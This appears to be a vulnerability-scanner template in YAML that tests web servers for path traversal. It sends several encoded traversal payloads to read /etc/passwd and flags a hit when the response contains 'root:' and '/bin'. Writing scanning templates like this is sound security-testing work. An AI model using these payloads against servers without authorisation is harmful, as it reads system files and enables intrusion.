id: poc-yaml-generic-path-traversal-linux
info:
  name: Generic Path Traversal Vulnerability (Linux)
  author: ProjectDiscoveryAI
  severity: high
  tags: path-traversal
http:
  - method: GET
    path:
      - "{{BaseURL}}/../../../../../../../../../../../../../../../../etc/passwd"
      - "{{BaseURL}}/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd"
      - "{{BaseURL}}/..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd"
      - "{{BaseURL}}/etc/passwd"
      - "{{BaseURL}}/%2f/../%2f/../%2f/../%2f/../%2f/../%2f/../%2f/../etc/passwd"
      - "{{BaseURL}}/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/etc/passwd"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "root:"
          - "/bin"
      - type: word
        negative: true
        words:
          - "<"
